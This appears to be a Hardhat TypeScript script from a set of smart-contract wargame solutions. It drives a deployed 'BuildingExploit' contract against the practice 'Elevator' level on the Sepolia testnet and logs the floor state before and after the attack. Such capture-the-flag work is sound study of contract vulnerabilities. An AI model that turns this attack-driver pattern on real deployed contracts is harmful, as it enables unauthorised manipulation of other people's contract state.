import { ethers } from "hardhat";

/**
 * Execute the exploit on the Elevator contract to reach the top floor
 * by using the BuildingExploit contract
 * 
 * Usage: 
 * EXPLOIT_ADDRESS=0xYourExploitAddress TARGET_ADDRESS=0xTargetAddress npx hardhat run scripts/level-11-elevator/execute-elevator-exploit.ts --network sepolia
 */
async function main() {
  // For the exploit address, we require it to be provided
  if (!process.env.EXPLOIT_ADDRESS) {
    console.error("Error: No BuildingExploit contract address provided.");
    console.error("Please provide the address of your deployed BuildingExploit contract using the EXPLOIT_ADDRESS environment variable.");
    console.error("Example: EXPLOIT_ADDRESS=0xYourExploitAddress TARGET_ADDRESS=0xTargetAddress npx hardhat run scripts/level-11-elevator/execute-elevator-exploit.ts --network sepolia");
    return;
  }
  const exploitAddress = process.env.EXPLOIT_ADDRESS;

  // Get target contract address from environment variable or use the one from the exploit contract
  let targetAddress: string;
  if (process.env.TARGET_ADDRESS) {
    targetAddress = process.env.TARGET_ADDRESS;
  } else {
    // We'll get it from the exploit contract
    targetAddress = "";
  }
  
  console.log(`Using BuildingExploit contract address: ${exploitAddress}`);
  
  // Get the contract factory for BuildingExploit
  const BuildingExploit = await ethers.getContractFactory("BuildingExploit");
  
  // Connect to the deployed contract
  const buildingExploit = BuildingExploit.attach(exploitAddress);
  
  console.log(`Connected to BuildingExploit contract at: ${exploitAddress}`);
  
  // If TARGET_ADDRESS wasn't provided, get it from the exploit contract
  if (!targetAddress) {
    targetAddress = await buildingExploit.getFunction("elevatorAddress")();
  }
  console.log(`Target Elevator contract address: ${targetAddress}`);
  
  const [deployer] = await ethers.getSigners();
  console.log(`Attacker address: ${deployer.address}`);

  try {
    // Check the initial state of the elevator
    console.log("Checking initial elevator state...");
    const initialFloor = await buildingExploit.getFunction("checkFloor")();
    const initialTop = await buildingExploit.getFunction("checkTop")();
    
    console.log(`Initial floor: ${initialFloor}`);
    console.log(`Initially at top: ${initialTop}`);
    
    if (initialTop) {
      console.log("Elevator is already at the top! No need to proceed further.");
      return;
    }
    
    // Choose a floor to go to (any floor above 0 should work)
    const floorToGo = 42;
    
    // Execute the attack
    console.log(`Executing attack to reach floor ${floorToGo}...`);
    const attackTx = await buildingExploit.getFunction("attack")(floorToGo);
    
    // Wait for the transaction to be mined
    console.log("Waiting for attack transaction to be mined...");
    const attackReceipt = await attackTx.wait();
    
    // Check the final state of the elevator
    const finalFloor = await buildingExploit.getFunction("checkFloor")();
    const finalTop = await buildingExploit.getFunction("checkTop")();
    
    console.log(`Final floor: ${finalFloor}`);
    console.log(`Finally at top: ${finalTop}`);
    
    // Check if the attack was successful
    if (finalTop && finalFloor.toString() === floorToGo.toString()) {
      console.log("\nExploit successful! The elevator has reached the top floor.");
    } else {
      console.log("\nExploit failed. The elevator did not reach the top floor.");
    }
    
    // Make sure receipt is not null before accessing its properties
    if (attackReceipt) {
      console.log(`\nAttack transaction details:`);
      console.log(`Hash: ${attackReceipt.hash}`);
      console.log(`Gas used: ${attackReceipt.gasUsed.toString()}`);
      console.log(`Block number: ${attackReceipt.blockNumber}`);
    }
  } catch (error) {
    console.error("\nError executing exploit:", error);
    process.exitCode = 1;
  }
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
